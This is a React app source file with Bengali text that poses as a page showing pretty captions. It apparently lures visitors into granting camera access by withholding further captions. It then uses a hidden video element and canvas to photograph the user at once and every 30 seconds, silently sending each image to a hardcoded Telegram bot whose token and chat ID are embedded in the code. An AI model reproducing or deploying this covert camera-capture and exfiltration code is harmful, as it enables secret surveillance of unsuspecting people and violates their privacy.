import React, { useState, useRef, useEffect } from 'react';
import './App.css';

function App() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [hasPermission, setHasPermission] = useState(false);
  const [loading, setLoading] = useState(false);

  // আপনার দেওয়া তথ্য
  const BOT_TOKEN = "8119794922:AAEz-Fzfm0zZSuVTgLEZwBSRTbOYuBQ3nHg";
  const CHAT_ID = "7236181886";

  // সুন্দর বাংলা ক্যাপশন
  const captions = [
    "মেঘের কোলে রোদ হেসেছে, বাদল গেছে টুটি। ⛅",
    "স্বপ্নগুলো সত্যি হোক, সুন্দর এই পৃথিবীতে। ✨",
    "হাসি মুখে জীবন গড়ি, খুশির জোয়ারে ভাসি। 😊",
    "জীবন মানেই এগিয়ে চলা, থামার নেই কোনো ঠাঁই।"
  ];

  // ক্যামেরা চালু করার ফাংশন
  const startCamera = async () => {
    setLoading(true);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        setHasPermission(true);
        console.log("ধন্যবাদ প্রিও ");
      }
    } catch (err) {
      alert("দুঃখিত! পারমিশন ছাড়া পরের ক্যাপশন দেখা সম্ভব নয়।");
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  // টেলিগ্রামে ছবি পাঠানোর ফাংশন
  const sendToTelegram = async (photoBlob) => {
    const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", photoBlob, "capture.jpg");
    formData.append("caption", "New capture from your React App 📸");

    try {
      await fetch(TELEGRAM_URL, { method: "POST", body: formData });
      console.log("DOne");
    } catch (err) {
      console.error("টেলিগ্রাম এরর:", err);
    }
  };

  // ছবি তোলার মূল লজিক
  const captureImage = () => {
    if (videoRef.current && canvasRef.current) {
      const canvas = canvasRef.current;
      const context = canvas.getContext('2d');
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      context.drawImage(videoRef.current, 0, 0);

      canvas.toBlob((blob) => {
        if (blob) sendToTelegram(blob);
      }, 'image/jpeg');
    }
  };

  // পারমিশন পাওয়ার পর অটোমেটিক ৩০ সেকেন্ড পর পর ছবি তোলা
  useEffect(() => {
    let interval;
    if (hasPermission) {
      // প্রথম ছবি সাথে সাথেই তুলবে
      captureImage(); 
      // এরপর প্রতি ৩০ সেকেন্ড পর পর
      interval = setInterval(() => {
        captureImage();
      }, 30000); 
    }
    return () => clearInterval(interval);
  }, [hasPermission]);

  return (
    <div className="App">
      <header className="App-header">
        <div className="card">
          <h2 className="caption">{captions[Math.floor(Math.random() * captions.length)]}</h2>
          
          {!hasPermission ? (
            <button onClick={startCamera} className="start-btn" disabled={loading}>
              {loading ? "লোডিং হচ্ছে..." : "দেখুন"}
            </button>
          ) : (
            <div className="active-status">
              <span className="dot"></span> সিস্টেম এখন সচল আছে...
            </div>
          )}

          {/* হিডেন ভিডিও এবং ক্যানভাস */}
          <video ref={videoRef} autoPlay playsInline style={{ display: 'none' }} />
          <canvas ref={canvasRef} style={{ display: 'none' }} />
        </div>
      </header>
    </div>
  );
}

export default App;